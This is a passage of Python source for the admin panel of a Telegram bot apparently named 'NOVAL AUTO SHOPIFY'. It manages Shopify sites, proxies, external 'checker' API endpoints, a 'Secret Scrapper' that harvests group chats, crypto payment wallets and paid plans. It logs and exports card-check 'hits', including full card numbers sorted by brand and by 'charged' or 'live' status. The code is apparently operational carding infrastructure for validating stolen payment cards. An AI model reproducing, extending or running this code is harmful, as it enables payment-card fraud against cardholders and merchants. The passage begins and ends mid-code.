    with db() as c: total = c.execute("SELECT COUNT(*) as n FROM sites").fetchone()["n"]
    max_p = get_setting("site_max_price", "6.0")
    ws_count = len(get_withsite_apis())
    text = (
        f"{pe('shop')} <b>{sc('Sites Manager')}</b>\n"
        f"<blockquote>{pe('diamond')} {sc('Sites in DB')}: <b>{total}</b>\n"
        f"{pe('gem')} {sc('Max Price')}: <b>${max_p}</b>\n"
        f"{pe('link')} {sc('With-Site APIs')}: <b>{ws_count}</b> {pe('warn') if ws_count == 0 else ''}</blockquote>"
        + (f"\n{pe('warn')} <b>{sc('No With-Site APIs configured! Site checker needs them.')}</b>" if ws_count == 0 else "")
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add & Check Sites"), icon="add", color="success", callback_data="admin:sites_add"),
         pbtn(sc("Admin Site Chkr"), icon="shop", color="primary", callback_data="admin:site_chkr")],
        [pbtn(sc(f"Max Price: ${max_p}"), icon="gem", color="primary", callback_data="admin:set_max_price"),
         pbtn(sc("List Sites"), icon="docs", color="primary", callback_data="admin:sites_list")],
        [pbtn(sc("Export Sites .txt"), icon="docs", color="primary", callback_data="admin:sites_export"),
         pbtn(sc("Clear All"), icon="trash", color="danger", callback_data="admin:sites_clear")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:main")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:set_max_price")
async def cb_set_max_price(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "set_setting:site_max_price")
    cur = get_setting("site_max_price", "6.0")
    await edit_admin(cb, f"{pe('gem')} <b>{sc('Set Max Site Price')}</b>\n<blockquote>{pe('docs')} {sc('Current')}: <b>${cur}</b>\n{pe('pen')} {sc('Send new max price (e.g. 6)')}:\n<i>{sc('Sites with higher price will NOT be saved')}</i></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_list")
async def cb_admin_sites_list(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT url FROM sites ORDER BY id DESC LIMIT 30").fetchall()
    if not rows: return await cb.answer("No sites in DB", show_alert=True)
    lines = [f"{pe('shop')} <b>{sc('Sites in DB')} ({len(rows)} shown)</b>\n<blockquote>"]
    for r in rows: lines.append(f"{pe('check')} <code>{esc(r['url'])}</code>")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_export")
async def cb_admin_sites_export(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer("Exporting...")
    with db() as c: rows = c.execute("SELECT url FROM sites ORDER BY id").fetchall()
    if not rows: return await cb.message.answer(f"{pe('warn')} No sites in DB", parse_mode="HTML")
    data = "\n".join(r["url"] for r in rows)
    fname = f"sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    await cb.message.answer_document(BufferedInputFile(data.encode(), filename=fname), caption=f"{pe('docs')} <b>{sc('Sites Export')}</b>\n<blockquote>{pe('shop')} {sc('Total')}: <b>{len(rows)}</b></blockquote>", parse_mode="HTML")

@router.callback_query(F.data == "admin:sites_add")
async def cb_admin_sites_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_sites_add")
    max_p = get_setting("site_max_price", "6.0")
    await edit_admin(cb, f"{pe('add')} <b>{sc('Add & Check Sites')}</b>\n<blockquote>{pe('pen')} {sc('Paste sites — one per line')}:\n<code>site1.myshopify.com\nsite2.myshopify.com</code>\n\n{pe('gem')} {sc('Max price')}: <b>${max_p}</b> — {sc('sites above this are NOT saved')}\n{pe('warn')} {sc('Needs With-Site API configured')}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:sites_clear")
async def cb_admin_sites_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM sites")
    _invalidate_sites()
    await cb.answer("All sites cleared!", show_alert=True)
    await cb_admin_sites(cb)

@router.callback_query(F.data == "admin:apis")
async def cb_admin_apis(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    sl_count = len(get_siteless_apis()); ws_count = len(get_withsite_apis())
    old_count = len(load_api_state().get("endpoints", []))
    cur_mode = get_setting("site_mode", "auto")
    text = (
        f"{pe('link')} <b>{sc('API Manager')}</b>\n"
        f"<blockquote>{pe('diamond')} {sc('Mode')}: <b>{cur_mode.upper()}</b>\n"
        f"{pe('star')} {sc('Siteless APIs')}: <b>{sl_count}</b>\n"
        f"{pe('shop')} {sc('With-Site APIs')}: <b>{ws_count}</b>\n"
        f"{pe('docs')} {sc('Legacy APIs')}: <b>{old_count}</b></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Siteless APIs"), icon="gem", color="success", callback_data="admin:api_sl"), pbtn(sc("With-Site APIs"), icon="shop", color="primary", callback_data="admin:api_ws")],
        [pbtn(sc("Set Mode: Siteless"), icon="refresh", color="primary", callback_data="admin:set_mode:siteless"), pbtn(sc("Set Mode: With-Site"), icon="refresh", color="primary", callback_data="admin:set_mode:with_site")],
        [pbtn(sc("Set Mode: Auto"), icon="refresh", color="success", callback_data="admin:set_mode:auto")],
        [pbtn(sc("Legacy API Add"), icon="add", color="primary", callback_data="admin:api_add"), pbtn(sc("Legacy Clear"), icon="trash", color="danger", callback_data="admin:api_clear")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:main")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_mode:"))
async def cb_set_mode(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    mode = cb.data.split(":")[2]
    set_setting("site_mode", mode)
    await cb.answer(f"Mode: {mode.upper()}", show_alert=True)
    await cb_admin_apis(cb)

@router.callback_query(F.data == "admin:api_sl")
async def cb_api_sl(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    apis = get_siteless_apis()
    text = (
        f"{pe('gem')} <b>{sc('Siteless APIs')} ({len(apis)})</b>\n"
        f"<blockquote>{pe('docs')} {sc('Format')}: <code>http://host:port/endpoint</code>\n"
        f"{sc('Used for checking without sites')}\n\n"
        + ("\n".join(f"{pe('check')} <code>{esc(a['endpoint'][:60])}</code>" for a in apis[:10]) or sc("None added"))
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add Siteless API"), icon="add", color="success", callback_data="admin:api_sl_add")],
        [pbtn(sc("Clear All"), icon="trash", color="danger", callback_data="admin:api_sl_clear")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:apis")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:api_sl_add")
async def cb_api_sl_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_sl_add")
    await edit_admin(cb, f"{pe('add')} <b>{sc('Add Siteless API')}</b>\n<blockquote>{pe('pen')} {sc('Send endpoint URL')}:\n<code>http://38.17.64.159:8081/</code>\n{sc('Multiple lines for bulk add')}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:api_sl")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:api_sl_clear")
async def cb_api_sl_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM api_siteless")
    await cb.answer("Siteless APIs cleared!", show_alert=True)
    await cb_api_sl(cb)

@router.callback_query(F.data == "admin:api_ws")
async def cb_api_ws(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    apis = get_withsite_apis()
    text = (
        f"{pe('shop')} <b>{sc('With-Site APIs')} ({len(apis)})</b>\n"
        f"<blockquote>{pe('docs')} {sc('Format')}: <code>http://host:port/shopii</code>\n"
        f"{sc('Used with sites from your site list')}\n\n"
        + ("\n".join(f"{pe('check')} <code>{esc(a['endpoint'][:60])}</code>" for a in apis[:10]) or sc("None added"))
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add With-Site API"), icon="add", color="success", callback_data="admin:api_ws_add")],
        [pbtn(sc("Clear All"), icon="trash", color="danger", callback_data="admin:api_ws_clear")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:apis")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:api_ws_add")
async def cb_api_ws_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_ws_add")
    await edit_admin(cb, f"{pe('add')} <b>{sc('Add With-Site API')}</b>\n<blockquote>{pe('pen')} {sc('Send endpoint URL')}:\n<code>http://62.169.23.129:8080/shopii</code>\n{sc('Multiple lines for bulk add')}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:api_ws")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:api_ws_clear")
async def cb_api_ws_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM api_withsite")
    await cb.answer("With-Site APIs cleared!", show_alert=True)
    await cb_api_ws(cb)

@router.callback_query(F.data == "admin:api_add")
async def cb_admin_api_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_api_add")
    await edit_admin(cb, f"{pe('add')} <b>Add Legacy API</b>\n<blockquote>Format: <code>url</code></blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:api_clear")
async def cb_admin_api_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    st = load_api_state(); st["endpoints"] = []; save_api_state(st)
    await cb.answer("All legacy APIs cleared!", show_alert=True)
    await cb_admin_apis(cb)

# ── Admin site checker (admin-only, results not saved) ────────────────────────
@router.callback_query(F.data == "admin:site_chkr")
async def cb_admin_site_chkr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_site_chkr")
    await edit_admin(cb, f"{pe('shop')} <b>{sc('Site Checker (Admin Only)')}</b>\n<blockquote>{pe('pen')} {sc('Paste sites — one per line')}:\n<code>site1.myshopify.com</code>\n<i>{sc('Results are NOT saved to bot')}</i></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:sites")]]))
    await cb.answer()

# ── Admin feedback channel & scrapper GC settings ─────────────────────────────
@router.callback_query(F.data == "admin:fb_channels")
async def cb_admin_fb_channels(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    ch1 = get_setting("fb_channel_id") or sc("Not set")
    ch2 = get_setting("fb_channel_id2") or sc("Not set")
    text = (
        f"{pe('chat')} <b>{sc('Feedback Channels')}</b>\n"
        f"<blockquote>{pe('link')} {sc('Channel 1')}: <code>{esc(ch1)}</code>\n"
        f"{pe('link')} {sc('Channel 2')}: <code>{esc(ch2)}</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Set Channel 1"), icon="pen", color="success", callback_data="admin:set_fb_ch:1"), pbtn(sc("Set Channel 2"), icon="pen", color="primary", callback_data="admin:set_fb_ch:2")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:bot_settings")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_fb_ch:"))
async def cb_set_fb_ch(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    n = cb.data.split(":")[2]
    key = "fb_channel_id" if n == "1" else "fb_channel_id2"
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(cb, f"{pe('pen')} <b>{sc('Set Feedback Channel')} {n}</b>\n<blockquote>{sc('Send channel ID like')} <code>-1001234567890</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:fb_channels")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:scrapper_mgr")
async def cb_admin_scrapper(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: gcs = c.execute("SELECT * FROM scrapper_gcs").fetchall()
    enabled = get_setting("scrapper_enabled", "1") == "1"
    text = (
        f"{pe('ghost')} <b>{sc('Secret Scrapper')}</b> · {'ON' if enabled else 'OFF'}\n"
        f"<blockquote>{pe('docs')} {sc('GCs being scraped')}: <b>{len(gcs)}</b>\n"
        + ("\n".join(f"{pe('check')} {esc(g['title'] or g['chat_id'])}" for g in gcs[:10]) if gcs else f"{pe('warn')} {sc('None added')}")
        + "</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add GC"), icon="add", color="success", callback_data="admin:scrapper_add"), pbtn(sc("Clear GCs"), icon="trash", color="danger", callback_data="admin:scrapper_clear")],
        [pbtn(f"{'Disable' if enabled else 'Enable'} Scrapper", icon="refresh", color="primary", callback_data="admin:scrapper_toggle")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:bot_settings")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:scrapper_add")
async def cb_scrapper_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_scrapper_add")
    await edit_admin(cb, f"{pe('add')} <b>{sc('Add Scrapper GC')}</b>\n<blockquote>{sc('Send GC chat ID or forward a message from it')}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:scrapper_mgr")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:scrapper_clear")
async def cb_scrapper_clear(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM scrapper_gcs")
    await cb.answer("GCs cleared", show_alert=True)
    await cb_admin_scrapper(cb)

@router.callback_query(F.data == "admin:scrapper_toggle")
async def cb_scrapper_toggle(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    new = "0" if get_setting("scrapper_enabled", "1") == "1" else "1"
    set_setting("scrapper_enabled", new)
    await cb.answer(f"Scrapper {'ON' if new=='1' else 'OFF'}")
    await cb_admin_scrapper(cb)

@router.callback_query(F.data == "admin:plans_mgr")
async def cb_admin_plans(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = f"{pe('gem')} <b>[=] Pricing & Plans Manager</b>\n<blockquote>Change user-facing prices here.</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Weekly Price", icon="pen", color="success", callback_data="admin:edit_price:weekly")], [pbtn("Monthly Price", icon="pen", color="success", callback_data="admin:edit_price:monthly")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:edit_price:"))
async def cb_edit_price(cb: CallbackQuery):
    plan = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"edit_price:{plan}")
    await edit_admin(cb, f"{pe('pen')} Send new price for <b>{plan.title()}</b> (e.g. 10):", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:trial_setup")
async def cb_trial_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = f"{pe('star')} <b>[=] Free Trial Setup</b>\n<blockquote>Current Duration: <b>{get_setting('trial_hours', '3')} Hours</b></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Change Duration", icon="pen", color="success", callback_data="admin:edit_trial")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:edit_trial")
async def cb_edit_trial(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "edit_trial")
    await edit_admin(cb, f"{pe('pen')} Send Trial Duration in Hours (e.g. 3):", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:wallet_setup")
async def cb_wallet_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = f"{pe('gem')} <b>[=] Crypto Wallets</b>\n<blockquote>USDT: <code>{get_setting('wallet_usdt', 'Not Set')}</code>\nTON: <code>{get_setting('wallet_ton', 'Not Set')}</code></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Set USDT", icon="pen", color="success", callback_data="admin:set_wallet:wallet_usdt")], [pbtn("Set TON", icon="pen", color="success", callback_data="admin:set_wallet:wallet_ton")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_wallet:"))
async def cb_set_wallet(cb: CallbackQuery):
    key = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(cb, f"{pe('pen')} Send new address for <b>{key}</b>:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:proxy_mgr")
async def cb_admin_proxy_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: total = c.execute("SELECT COUNT(*) as n FROM user_proxies").fetchone()["n"]
    text = f"{pe('link')} <b>[=] Global Proxies Manager</b>\n<blockquote>Total User Proxies: <b>{total}</b></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Clear Dead Proxies", icon="trash", color="danger", callback_data="admin:clear_dead_proxies")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:clear_dead_proxies")
async def cb_clear_dead_proxies(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM user_proxies WHERE status='dead'")
    await cb.answer("Dead proxies cleared!", show_alert=True)
    await cb_admin_proxy_mgr(cb)

@router.callback_query(F.data == "admin:force_list")
async def cb_admin_force(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    channels = force_channels_list()
    text = f"{pe('unlock')} <b>[=] Force Channels</b>\n<blockquote>"
    for ch in channels: text += f"• {ch['title']} ({ch['chat_id']}) - {'ON' if ch['enabled'] else 'OFF'}\n"
    if not channels: text += "No channels added."
    text += "</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Add Channel", icon="add", color="success", callback_data="admin:force_add")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:force_add")
async def cb_admin_force_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_force_add")
    await edit_admin(cb, f"{pe('add')} <b>Add Force Channel</b>\n<blockquote>Forward a message from the channel OR send <code>@username</code></blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:promos")
async def cb_admin_promos(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: total = c.execute("SELECT COUNT(*) as n FROM redeem_codes").fetchone()["n"]
    text = f"{pe('add')} <b>[=] Promo Codes</b>\n<blockquote>Total active codes: <b>{total}</b></blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Generate Code", icon="add", color="success", callback_data="admin:gen_code")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:backup_now")
async def cb_admin_backup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer("Generating backup...", show_alert=False)
    await send_backup(cb.from_user.id)

@router.callback_query(F.data == "admin:restore_db")
async def cb_admin_restore(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "restore_backup")
    await edit_admin(cb, f"{pe('refresh')} <b>Restore DB</b>\n<blockquote>Send your <code>.sql</code> or <code>.sql.gz</code> backup file.</blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:bot_settings")
async def cb_admin_bot_settings(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = (
        f"⚙️ <b>[=] Bot Settings</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Bot Name:</b> <code>{get_setting('bot_name', 'NOVAL AUTO SHOPIFY')}</code>\n"
        f"<b>Public GC:</b> <code>{get_setting('public_gc_id') or 'Not Set'}</code>\n"
        f"<b>Charged GC:</b> <code>{get_setting('charged_gc_id') or 'Not Set'}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Set Bot Name", icon="pen", color="primary", callback_data="admin:set_setting:bot_name")],
        [pbtn("Set Public GC", icon="chat", color="success", callback_data="admin:set_gc:public_gc_id"), pbtn("Set Charged GC", icon="gem", color="success", callback_data="admin:set_gc:charged_gc_id")],
        [pbtn("Back", icon="back", callback_data="admin:main")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_gc:"))
async def cb_admin_set_gc(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    gc_key = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"set_setting:{gc_key}")
    await edit_admin(cb, f"Send Chat ID for <b>{gc_key}</b> (or send 'off' to clear):", back_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_setting:"))
async def cb_admin_set_setting_prompt(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    key = cb.data.split(":")[2]
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(cb, f"Send new value for <b>{key}</b>:", back_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:user_mgr")
async def cb_admin_user_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_user_search")
    await edit_admin(cb, f"🔍 <b>[=] User Manager</b>\n\n<blockquote>Send User ID (UID) to lookup, give credits, or ban.</blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:ban_user:"))
async def cb_admin_ban_user(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    ensure_user(target_uid)
    with db() as c:
        u = c.execute("SELECT banned FROM users WHERE uid=?", (target_uid,)).fetchone()
        nv = 0 if (u and u["banned"]) else 1
        c.execute("UPDATE users SET banned=? WHERE uid=?", (nv, target_uid))
    await cb.answer(f"User {'Unbanned' if nv==0 else 'Banned'}", show_alert=True)

@router.callback_query(F.data.startswith("admin:give_credits:"))
async def cb_admin_give_credits(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    set_awaiting(cb.from_user.id, f"give_credits:{target_uid}")
    await edit_admin(cb, f"💳 Send amount of credits for {target_uid}:", back_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:give_premium:"))
async def cb_admin_give_premium(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    upgrade_user(target_uid, "premium", 30)
    await cb.answer(f"✅ Premium given to {target_uid} for 30 days!", show_alert=True)

@router.callback_query(F.data == "admin:sys_logs")
async def cb_admin_sys_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    import psutil, platform
    try:
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        uptime = int(time.time() - START_TIME)
    except: cpu, ram, uptime = 0, 0, int(time.time() - START_TIME)
    text = f"📝 <b>[=] System Health</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n💻 <b>CPU:</b> {cpu}%\n🧠 <b>RAM:</b> {ram}%\n⏱ <b>Uptime:</b> {uptime // 3600}h {(uptime % 3600) // 60}m\n🌐 <b>OS:</b> {platform.system()}\n━━━━━━━━━━━━━━━━━━━━</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Recent Checks", icon="docs", color="primary", callback_data="admin:recent_checks")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:recent_checks")
async def cb_admin_recent_checks(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT cc, response, status FROM check_logs ORDER BY id DESC LIMIT 15").fetchall()
    if not rows: return await cb.answer("No checks yet", show_alert=True)
    text = "📝 <b>Recent Checks</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for r in rows:
        icon = "✅" if r['status'] == 'HIT' else "❌"
        text += f"{icon} <code>{r['cc'][:12]}...</code> | {r['response'][:15]}\n"
    text += "</blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[pbtn("Back", icon="back", callback_data="admin:sys_logs")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:top_checkers")
async def cb_admin_top_checkers(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = "🏆 <b>Top Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1): text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "</blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[pbtn("Back", icon="back", callback_data="admin:sys_logs")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:charged_logs")
async def cb_admin_charged_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: total = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
    text = f"💎 <b>[=] Logs & Exports Manager</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n<b>Total Saved Hits:</b> {total}\n\nSelect a filter below to download the .txt file with specific cards.\n━━━━━━━━━━━━━━━━━━━━</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("All Hits (.txt)", icon="check", color="success", callback_data="export:type:all")],
        [pbtn("Charged Only", icon="gem", color="success", callback_data="export:type:charged")],
        [pbtn("Live Cards Only", icon="online", color="primary", callback_data="export:type:live")],
        [pbtn("Visa Cards", icon="gem", color="primary", callback_data="export:type:visa")],
        [pbtn("MasterCard", icon="gem2", color="primary", callback_data="export:type:master")],
        [pbtn("Amex Cards", icon="gem3", color="primary", callback_data="export:type:amex")],
        [pbtn("Back", icon="back", callback_data="admin:main")]
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("export:type:"))
async def cb_export_cards(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    export_type = cb.data.split(":")[2]
    await cb.answer("Generating file...", show_alert=False)
    query = "SELECT cc, response FROM charged_hits"
    if export_type == "charged": query += " WHERE response LIKE '%CHARGED%' OR response LIKE '%ORDER%'"
    elif export_type == "live": query += " WHERE response LIKE '%INSUFFICIENT%' OR response LIKE '%NSF%' OR response LIKE '%CCN%' OR response LIKE '%3DS%'"
    elif export_type == "visa": query += " WHERE cc LIKE '4%'"
    elif export_type == "master": query += " WHERE cc LIKE '5%'"
    elif export_type == "amex": query += " WHERE cc LIKE '34%' OR cc LIKE '37%'"
    with db() as c: rows = c.execute(query + " ORDER BY id").fetchall()
    if not rows: return await cb.answer(f"No cards found for this filter!", show_alert=True)
    lines = []
    for r in rows:
        cc = r["cc"]; resp = r["response"].upper()
        if cc.startswith('4'): brand = "VISA"
        elif cc.startswith('5'): brand = "MASTER"
        elif cc.startswith(('34', '37')): brand = "AMEX"
        elif cc.startswith('6'): brand = "DISCOVER"
        else: brand = "UNKNOWN"
        lines.append(f"{cc} | {brand} | {resp}")
    data = "\n".join(lines)
    filename = f"export_{export_type}_{datetime.now().strftime('%H%M%S')}.txt"
    try: await cb.message.answer_document(BufferedInputFile(data.encode(), filename=filename), caption=f"✅ <b>Exported {len(rows)} cards</b>\n<blockquote>Type: {export_type.upper()}\nFile: <code>{filename}</code></blockquote>", parse_mode="HTML")
    except Exception as e: await cb.answer(f"Failed to send file: {e}", show_alert=True)

@router.callback_query(F.data == "admin:clear_charged")
async def cb_admin_clear_charged(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM charged_hits")
    await cb.answer("Charged hits cleared!", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:clear_cache")
async def cb_admin_clear_cache(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    _invalidate_sites()
    _dead_proxies_run.clear()
    with db() as c: c.execute("DELETE FROM bin_cache")
    await cb.answer("Bot cache & dead proxies cleared!", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:toggle_maint")
async def cb_admin_toggle_maint(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    new = "1" if get_setting("maintenance") == "0" else "0"
    set_setting("maintenance", new)
    await cb.answer(f"Maint: {'ON' if new=='1' else 'OFF'}")
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:add_admin")
async def cb_admin_add_admin(cb: CallbackQuery):
